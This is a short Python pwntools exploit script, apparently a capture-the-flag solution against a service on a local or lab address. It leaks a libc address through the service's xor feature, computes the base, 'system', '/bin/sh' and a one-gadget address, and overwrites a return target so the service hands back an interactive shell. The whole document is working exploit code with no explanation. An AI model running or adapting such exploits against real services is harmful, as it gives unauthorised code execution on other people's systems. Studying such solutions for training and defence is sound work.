#!/usr/bin/env python
from pwn import *

r = remote('127.0.0.1', 4000)
#r = remote('10.13.2.43', 30739)
libc = ELF('libc.so.6')

def process(s, key):
    r.sendafter('Your string:', s)
    r.sendafter('What do you want to xor :', key)

raw_input('#')

# leak libc address
# the address isn't always there, or not exactly the one we want, so sometimes error may occur
process('AAAAAAAA\x00', 'BBBBBBBB\x00')
r.recvuntil('Result:')
r.recvn(8)
libc_base = u64(r.recvn(6)+'\x00'*2) - 0xf7290
log.success('libc base: ' + hex(libc_base))
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))
one_gadget = libc_base + 0xf0274 # contraint: [rsp+0x50] == NULL

process('C'*32, 'D'*32)

log.success('one gadget: ' + hex(one_gadget))
log.success('target: ' + hex(one_gadget^0x400999^0xffffffffffffffff))
# the p64(0) is for one gagdet constraint
process('E'*8+p64(one_gadget^0x4009b4^0xffffffffffffffff)+'E'*64+p64(0)+'E'*40, 'F'*8+p64(0xffffffffffffffff)+'F'*112)

r.interactive()
